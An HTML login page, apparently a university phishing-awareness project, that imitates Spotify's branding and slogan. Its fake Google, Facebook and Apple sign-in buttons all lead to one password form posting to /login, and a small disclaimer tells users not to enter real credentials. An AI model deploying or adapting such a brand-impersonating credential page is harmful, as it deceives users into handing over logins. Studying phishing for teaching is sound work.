<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Music Portal</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>

<div class="app-wrapper">
    <div id="landing-screen" class="container">
        <!-- Generic Outline Musical Note Icon -->
        <div class="logo-wrapper">
            <svg width="45" height="45" viewBox="0 0 24 24" fill="#1db954">
                <path d="M12 3v10.55c-.59-.34-1.27-.55-2-.55-2.21 0-4 1.79-4 4s1.79 4 4 4 4-1.79 4-4V7h4V3h-6z"/>
            </svg>
        </div>
        <h1>Millions of songs.<br>Free to stream.</h1>
        <div class="button-list">
            <button class="btn btn-green" onclick="goToLogin()">Sign up free</button>
            <button class="btn btn-outline" onclick="goToLogin()">Continue with Google</button>
            <button class="btn btn-outline" onclick="goToLogin()">Continue with Facebook</button>
            <button class="btn btn-outline" onclick="goToLogin()">Continue with Apple</button>
            <button class="btn btn-text" onclick="goToLogin()">Log in</button>
        </div>
    </div>

    <div id="login-screen" class="container hidden">
        <div class="back-nav" onclick="goBack()">
            <svg width="24" height="24" viewBox="0 0 24 24" fill="white"><path d="M20 11H7.83l5.59-5.59L12 4l-8 8 8 8 1.41-1.41L7.83 13H20v-2z"/></svg>
        </div>
        
        <form id="loginForm" action="/login" method="POST">
            <div class="form-group">
                <label>Email or username</label>
                <input type="text" name="email" placeholder="Email or username" class="spotify-input" required>
            </div>
            <div class="form-group">
                <label>Password</label>
                <div class="password-wrapper">
                    <input type="password" id="passwordField" name="password" placeholder="Password" class="spotify-input" required>
                    <span class="toggle-password" onclick="togglePassword()">👁️</span>
                </div>
            </div>
        </form>
        
        <button class="btn btn-green" id="loginBtn" onclick="handleLogin()">
            <span id="btnText">Log In</span>
            <div id="spinner" class="spinner hidden"></div>
        </button>
        
        <!-- Educational Disclaimer -->
        <p style="margin-top: 30px; font-size: 11px; color: #b3b3b3; line-height: 1.4;">
            Warning: This is a university educational project. Do not enter your actual school credentials.
        </p>
    </div>
</div>

<script src="script.js"></script>
</body>
</html>
